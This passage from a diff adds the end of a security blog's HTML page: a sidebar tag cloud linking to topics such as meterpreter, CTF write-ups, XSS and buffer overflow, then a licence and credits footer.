+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/redis.html">redis</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bloodhound.html">bloodhound</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/api.html">api</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/webmin.html">webmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mail.html">mail</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/drupal.html">drupal</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/restic.html">restic</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/server.html">server</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/leak.html">leak</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/linux.html">Linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mangento.html">mangento</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/waf.html">WAF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/pth.html">PTH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
